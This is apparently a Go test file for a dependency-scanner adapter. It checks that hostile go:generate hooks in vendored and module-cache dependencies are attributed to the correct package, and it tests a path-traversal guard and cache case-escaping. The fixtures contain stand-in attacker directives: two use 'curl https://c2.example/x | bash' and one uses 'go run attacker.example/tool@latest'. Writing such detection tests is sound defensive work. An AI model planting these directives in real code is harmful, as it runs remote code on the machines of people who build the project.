package gomod

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/graph"
	"ihbv.io/depsnort/internal/purl"
)

func goNode(g *graph.Graph, mod, ver string, depth int) string {
	id := purl.NewGo(mod, ver).String()
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: "gomod", Name: mod, Version: ver, Depth: depth})
	return id
}

// hookPackages returns the set of package node IDs that own an install-hook node.
func hookPackages(g *graph.Graph) map[string]bool {
	out := map[string]bool{}
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook {
			out[n.Attr["hook.package"]] = true
		}
	}
	return out
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// TestExtractInstallSurface_VendoredDependency proves a hostile directive in a
// VENDORED dependency is attributed to that dependency node, not the root.
func TestExtractInstallSurface_VendoredDependency(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "go.mod"), "module app.example/m\n\ngo 1.21\n")
	// hostile go:generate in a vendored dependency
	writeFile(t, filepath.Join(dir, "vendor", "evil.example", "dep", "gen.go"),
		"package dep\n//go:generate sh -c \"curl https://c2.example/x | bash\"\n")

	g := graph.New()
	rootID := goNode(g, "app.example/m", "0.0.0", 0)
	g.MarkRoot(rootID)
	depID := goNode(g, "evil.example/dep", "v1.2.3", 1)

	_ = (&Adapter{}).ExtractInstallSurface(dir, g)
	owners := hookPackages(g)
	if !owners[depID] {
		t.Errorf("the vendored dependency %s must own the hook; owners=%v", depID, owners)
	}
	if owners[rootID] {
		t.Errorf("the root must NOT own the vendored dependency's hook; owners=%v", owners)
	}
}

// TestExtractInstallSurface_ModuleCacheDependency proves a dependency whose source
// lives in the module cache (with case-escaping) is scanned and attributed.
func TestExtractInstallSurface_ModuleCacheDependency(t *testing.T) {
	proj := t.TempDir()
	writeFile(t, filepath.Join(proj, "go.mod"), "module app.example/m\n\ngo 1.21\n")

	cache := t.TempDir()
	t.Setenv("GOMODCACHE", cache)
	// Module github.com/Evil/dep@v1.0.0 -> cache path github.com/!evil/dep@v1.0.0
	writeFile(t, filepath.Join(cache, "github.com", "!evil", "dep@v1.0.0", "boot.go"),
		"package dep\n//go:generate go run attacker.example/tool@latest\n")

	g := graph.New()
	rootID := goNode(g, "app.example/m", "0.0.0", 0)
	g.MarkRoot(rootID)
	depID := goNode(g, "github.com/Evil/dep", "v1.0.0", 1)

	_ = (&Adapter{}).ExtractInstallSurface(proj, g)
	if !hookPackages(g)[depID] {
		t.Errorf("the module-cache dependency %s must own the hook; owners=%v", depID, hookPackages(g))
	}
}

// TestExtractInstallSurface_NestedSubmoduleSkip proves a vendored submodule's
// hostile directive is attributed to the SUBMODULE node, not its parent module
// whose vendor directory physically contains it.
func TestExtractInstallSurface_NestedSubmoduleSkip(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "go.mod"), "module app.example/m\n\ngo 1.21\n")
	// parent module: a benign file
	writeFile(t, filepath.Join(dir, "vendor", "evil.example", "parent", "ok.go"),
		"package parent\nvar X = 1\n")
	// submodule (separate module) nested under the parent's vendor dir: hostile
	writeFile(t, filepath.Join(dir, "vendor", "evil.example", "parent", "sub", "gen.go"),
		"package sub\n//go:generate sh -c \"curl https://c2.example/x | bash\"\n")

	g := graph.New()
	rootID := goNode(g, "app.example/m", "0.0.0", 0)
	g.MarkRoot(rootID)
	parentID := goNode(g, "evil.example/parent", "v1.0.0", 1)
	subID := goNode(g, "evil.example/parent/sub", "v0.1.0", 1)

	_ = (&Adapter{}).ExtractInstallSurface(dir, g)
	owners := hookPackages(g)
	if !owners[subID] {
		t.Errorf("the submodule %s must own the hook; owners=%v", subID, owners)
	}
	if owners[parentID] {
		t.Errorf("the parent %s must NOT own the nested submodule's hook; owners=%v", parentID, owners)
	}
}

// TestCleanModuleIdent pins the traversal guard.
func TestCleanModuleIdent(t *testing.T) {
	for _, ok := range []string{"github.com/foo/bar", "example.com/x", "v1.2.3", "v2.0.0+incompatible"} {
		if !cleanModuleIdent(ok) {
			t.Errorf("%q should be a clean identifier", ok)
		}
	}
	for _, bad := range []string{"", "..", "a/../b", "../x", "a//b", "a/./b", "a\\b", "a\x00b"} {
		if cleanModuleIdent(bad) {
			t.Errorf("%q must be rejected (traversal/empty)", bad)
		}
	}
}

// TestEscapeGoCasePath pins the cache case-encoding.
func TestEscapeGoCasePath(t *testing.T) {
	cases := map[string]string{
		"github.com/foo/bar":         "github.com/foo/bar", // lowercase unchanged
		"github.com/Azure/foo":       "github.com/!azure/foo",
		"github.com/BurntSushi/toml": "github.com/!burnt!sushi/toml",
		"v1.2.3":                     "v1.2.3",
	}
	for in, want := range cases {
		if got := escapeGoCasePath(in); got != want {
			t.Errorf("escapeGoCasePath(%q) = %q, want %q", in, got, want)
		}
	}
}
